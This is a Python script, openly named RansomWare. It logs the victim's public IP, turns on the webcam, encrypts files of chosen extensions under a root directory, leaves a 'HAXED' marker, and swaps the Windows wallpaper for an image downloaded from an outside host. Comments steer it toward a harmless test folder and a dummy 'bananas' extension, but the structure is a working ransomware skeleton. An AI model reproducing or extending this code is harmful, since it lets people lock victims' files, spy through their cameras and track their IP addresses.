#!/usr/bin/env python3
import os
import webbrowser
import requests
import urllib
import ctypes
import encryptor
import threading
import tkinter as tk
import cv2


# File exstensions to seek out and Encrypt
"""
    CAUTION: start with something crazy like bananas
"""
extensions = [
    'bananas',
]


class RansomWare:

    def __init__(self):
        self.public_key = None

        ''' Root directorys to start Encryption/Decryption from
            CAUTION: Do NOT use self.sysRoot on your own PC as you could end up messing up your system etc...
            CAUTION: Play it safe, create a mini root directory to see how this software works it is no different
        '''
        # Use sysroot to create absolute path for files, etc. And for encrypting whole system
        self.sysRoot = os.path.expanduser('~/test')

        self.system_encrypted = self.check_encrypted()

        # Get public IP of person, for more analysis etc. (Check if you have hit gov, military ip space LOL)
        self.publicIP = requests.get('https://api.ipify.org').text
        print(f"[IP ADDRESS] {self.publicIP}")
        print(f"[SYS ROOT] {self.sysRoot}")
        self.start_attack()

    def start_attack(self):
        try:
            # self.open_browser()
            self.take_picture()
            self.encryptSystem()
            self.change_desktop_background()
        except Exception as err:
            print(err)

    def change_desktop_background(self):
        imageUrl = 'https://atlasworlds.blob.core.windows.net/media/joverall22__QGdtYWlsLmNvbQ==/1e09dad7-c74a-4d85-89d0-82c342c50ed7.png'
        # Go to specif url and download+save image using absolute path
        path = f'{self.sysRoot}/background.jpg'
        urllib.request.urlretrieve(imageUrl, path)
        SPI_SETDESKWALLPAPER = 20
        # Access windows dlls for funcionality eg, changing dekstop wallpaper
        ctypes.windll.user32.SystemParametersInfoW(
            SPI_SETDESKWALLPAPER, 0, path, 0)

    def open_browser(self):
        webbrowser.open('https://jakeoverall.github.io/haxed', new=1)

    def encryptSystem(self):
        if not self.system_encrypted:
            encryptor.encryptDirectory(self.sysRoot, extensions)
            open(".encrypted", "wb").write("HAXED".encode())

    def take_picture(self):
        try:
            vid = cv2.VideoCapture(0)
            while True:
                ret, frame = vid.read()
                cv2.imshow('frame', frame)
                if cv2.waitKey(1) & 0xFF == ord('q'):
                    break
            vid.release()
            cv2.destroyAllWindows()
        except Exception as err:
            print(err)

    def check_encrypted(self):
        """
            Loads the key from the current directory named `key.key`
        """
        try:
            written = open(".encrypted", "rb").read()
            return True if written else False
        except:
            return False


def main():
    try:
        RansomWare()
    except Exception as err:
        print(err)


if __name__ == '__main__':
    main()
